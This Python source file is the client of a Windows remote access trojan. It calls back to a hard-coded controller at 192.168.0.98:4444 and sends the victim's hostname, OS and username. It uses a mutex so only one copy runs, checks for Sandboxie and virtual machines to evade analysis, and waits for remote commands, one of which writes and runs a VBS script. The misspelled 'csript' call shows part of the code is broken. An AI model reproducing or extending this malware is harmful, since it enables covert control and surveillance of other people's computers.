# need install python packages before running code
# python -m pip install pywin32 pyscreeze

import socket
import os
import sys
import platform
import time
import ctypes
import subprocess
import threading
import wmi

import win32api
import winerror
import win32event
import win32crypt

from winreg import *

strHost = "192.168.0.98"
intPort = 4444

strPath = os.path.realpath(sys.argv[0])
TMP = os.environ['APPDATA']

intBuff = 1024
#only one single thread - prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


def detectSandboxie():
    try:
        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")

        return " (Sandboxie) "

    except:
        return ""


def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select *  from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return " (Virtual Machine) "
    return ""


def server_connect():
    global obj_socket

    while True:
        try:
            obj_socket = socket.socket()
            obj_socket.connect((strHost, intPort))

        except socket.error:
            time.sleep(5)  # after 5 second will try again

        else:
            break

    str_user_info = socket.gethostname() + "'," + platform.system() + "  " + \
        platform.release() + detectSandboxie() + detectVM() + \
        "', " + os.environ["USERNAME"]
    send(str.encode(str_user_info))


def decode_utf8(data): return data.decode("utf-8")


def recv(buffer): return obj_socket.recv(buffer)


def send(data): return obj_socket.send(data)


server_connect()


def messageBox(msg):
    objVBS = open(TMP + "/m.vbs", "w")
    objVBS.write("MsgBox " + msg + " Message")
    objVBS.close()

    subprocess.Popen(["csript", TMP + "/m.vbs"], shell=True)


while True:
    try:
        while True:
            str_data = recv(intBuff)
            str_data = decode_utf8(str_data)

            if str_data == "exit":
                obj_socket.close()
                sys.exit(0)

            elif str_data[:3] == "msg":
                messageBox(str_data[4:])

    except socket.error:
        obj_socket.close()
        del obj_socket

        server_connect()
